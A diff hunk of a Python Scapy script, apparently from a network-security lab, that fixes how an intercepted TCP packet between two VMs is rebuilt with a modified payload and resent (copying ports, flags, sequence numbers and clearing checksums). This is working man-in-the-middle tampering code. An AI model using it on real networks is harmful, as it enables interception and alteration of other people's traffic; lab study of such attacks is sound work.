@@ -13,15 +13,17 @@ def spoof_pkt(pkt):
             print("*** Modified data: %s" % (newdata))
 
             # Reconstruct the packet with the modified payload
-            newpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(sport=pkt[TCP].sport, dport=p>
-            newpkt = newpkt / Raw(load=newdata)
+            newpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack) / Raw(load=newdata)
             del newpkt[IP].chksum
             del newpkt[TCP].chksum
 
             send(newpkt)
             print("*** Sent modified packet")
         elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
-            newpkt = IP(pkt[IP]) / TCP(pkt[TCP]) / Raw(load=pkt[TCP].payload.load)
+            newpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack) / Raw(load=pkt[TCP].payload.load)
+            del newpkt[IP].chksum
+            del newpkt[TCP].chksum
+
             send(newpkt)
             print("*** Sent packet from VM B to VM A")
 
